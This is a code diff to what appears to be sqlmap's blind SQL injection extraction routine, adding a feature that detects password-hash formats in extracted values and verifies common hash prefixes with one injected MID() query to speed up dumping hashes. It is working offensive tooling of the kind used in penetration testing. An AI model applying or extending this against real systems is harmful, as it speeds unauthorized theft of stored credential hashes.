@@ -237,6 +237,34 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                             prefix_str, len(prefix_str))
                         logger.info(infoMsg)
 
+            # ─── Nostradamus: Hash prefix skip ───
+            # If hash type was auto-detected from previous value, verify the
+            # fixed hash prefix (e.g., '$P$', '$2y$10$') with a single MID() query.
+            if firstChar == 0 and not partialValue and predictor._auto_detected_hash_prefix:
+                hash_prefix = predictor._auto_detected_hash_prefix
+                prefixLen = len(hash_prefix)
+                testValue = unescaper.escape("'%s'" % hash_prefix) if "'" not in hash_prefix else unescaper.escape("%s" % hash_prefix, quote=False)
+
+                query = getTechniqueData().vector
+                query = agent.prefixQuery(query.replace(INFERENCE_MARKER,
+                    "MID((%s),1,%d)%s%s" % (expressionUnescaped, prefixLen, INFERENCE_EQUALS_CHAR, testValue)))
+                query = agent.suffixQuery(query)
+
+                result = Request.queryPage(agent.payload(newValue=query),
+                                           timeBasedCompare=timeBasedCompare, raise404=False)
+                incrementCounter(getTechnique())
+
+                if result:
+                    partialValue = hash_prefix
+                    firstChar = len(hash_prefix)
+
+                    predictor.stats_prefix_skips += 1
+                    predictor.stats_prefix_chars_saved += len(hash_prefix)
+
+                    infoMsg = "hash prefix skip: verified '%s' (%d chars skipped)" % (
+                        hash_prefix, len(hash_prefix))
+                    logger.info(infoMsg)
+
         if isinstance(length, six.string_types) and isDigit(length) or isinstance(length, int):
             length = int(length)
         else:
@@ -1022,6 +1050,11 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
                 # Track for ordered extraction min-char optimization
                 kb.predictor.set_previous_value(finalValue)
+
+                # Auto-detect hash pattern from extracted value
+                # If first value looks like a hash, restrict charset for all subsequent rows
+                if not kb.predictor._auto_detected_hash_type:
+                    kb.predictor.detect_hash_from_value(finalValue)
 
                 # Learn IP prefix for cross-row prediction
                 if kb.predictor._current_column_context:
